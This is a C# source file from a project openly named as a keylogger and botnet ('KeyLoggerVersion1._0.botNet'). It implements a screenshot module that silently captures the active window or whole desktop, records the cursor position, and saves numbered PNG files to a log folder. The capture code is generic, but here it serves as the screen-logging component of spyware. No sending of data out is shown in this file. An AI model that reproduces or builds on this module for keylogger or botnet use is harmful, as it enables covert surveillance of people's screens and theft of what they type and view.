using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLoggerVersion1._0.botNet
{
    #region Thank to directory for me 
    // Referrence KvanTTT Code https://stackoverflow.com/questions/1163761/capture-screenshot-of-active-window
    #endregion
    public enum CaptureMode
    {
        Screen, Window
    }
    public class TakeScreenShot
    {
        private static TakeScreenShot _Instance;

        public static TakeScreenShot Instance 
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new TakeScreenShot();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        public TakeScreenShot() { }

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        // Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowrect
        // <Summary>
        // Retrieves the dimensions of the bounding rectangle of the specified window.
        // The dimensions are given in screen coordinates that are relative to the upper-left corner of the screen.
        // </Summary>
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        // Capture the Screen and Save the file By HWND or .NET/ Control Form
        public void CaptureAndSave(string filename, CaptureMode mode = CaptureMode.Window, ImageFormat format = null)
        {
            ImageSave(filename, Capture(mode), format);
        }

        // Override Func to use for situation when Capture
        public void CaptureAndSave(string filename, IntPtr handle, ImageFormat format = null)
        {
            ImageSave(filename, Capture(handle), format);
        }

        public void CaptureAndSave(string filename, Control c, ImageFormat format = null)
        {
            ImageSave(filename, Capture(c), format);
        }

        // Capture the active window (default) or the desktop and return a bitmap
        public Bitmap Capture(CaptureMode mode = CaptureMode.Window)
        {
            return Capture(mode == CaptureMode.Screen ? API.GetDesktopWindow() : API.GetForegroundWindow());
        }

        // Capture the a Net control , form, UserControl, etc 
        public Bitmap Capture(Control c)
        {
            return Capture(c.Handle);
        }

        //  Capture a specific window and return it to bitmap 
        public Bitmap Capture(IntPtr handle)
        {
            Rectangle bounds;
            var rect = new Rect();
            GetWindowRect(handle, ref rect);
            bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            CursorPosition = new Point(Cursor.Position.X - rect.Left, Cursor.Position.Y - rect.Top);

            var result = new Bitmap(bounds.Width, bounds.Height);
            using (var g = Graphics.FromImage(result))
                g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

            return result;
        }

        // Position of Cursor to start the Capture
        public Point CursorPosition;

        // Save Image to specific name 
        public void ImageSave(string filename, Image image, ImageFormat format)
        {
            try
            {
                format = format ?? ImageFormat.Png;
                if (!Directory.Exists(API.SaveLogFileImage))
                {
                    Directory.CreateDirectory(API.SaveLogFileImage);
                }
                string path = API.SaveLogFileImage;
                var prefix = "ScreenShot" + DateTime.Now.ToLongDateString();
                //var prefix = DateTime.Now.ToString("dd/MM/yyyy hh::mm::ss");
                var fileName = Enumerable.Range(1, 10000)
                                .Select(n => Path.Combine(path, $"{prefix}-{n}.png"))
                                .First(p => !File.Exists(p));
                image.Save(fileName, format);
            }
            catch(Exception err)
            {
                Console.WriteLine(err.ToString());
            }
        }
    }
}
